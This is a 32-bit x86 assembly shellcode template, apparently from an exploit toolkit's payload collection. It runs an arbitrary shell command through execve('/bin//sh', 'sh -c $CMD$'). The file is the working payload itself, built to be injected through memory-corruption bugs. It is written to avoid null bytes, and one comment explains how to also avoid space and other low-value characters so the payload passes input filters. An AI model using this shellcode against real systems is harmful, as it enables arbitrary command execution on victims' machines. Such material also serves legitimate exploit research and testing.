; execve("/bin//sh", ["sh", "-c", "$CMD$"], [NULL]), null-free, 47+cmdlen bytes
BITS 32
jmp push_pc

_start:
pop esi ; address of cmd
; setup args
xor eax, eax
push eax

push 0x68732f2f     ; "//sh"
mov ecx, esp
inc ecx
inc ecx             ; ecx -> "sh"
push 0x6e69622f     ; "/bin"
mov ebx, esp        ; path -> "/bin/sh"

push ax
push word 0x632d
mov edi, esp        ; edi -> "-c"

push eax
mov edx, esp        ; envp -> [NULL]
push esi
push edi
push ecx
mov ecx, esp        ; argv -> ["sh", "-c", "$CMD$"]

mov al, 11          ; __NR_execve
; Adjust the preceding line to avoid space chars.
; "mov al, 0x85; rol al, 1" works well (also avoids any char <= 0x20)

int 0x80            ; syscall

push_pc:
call _start

cmd: db "$CMD$", 0
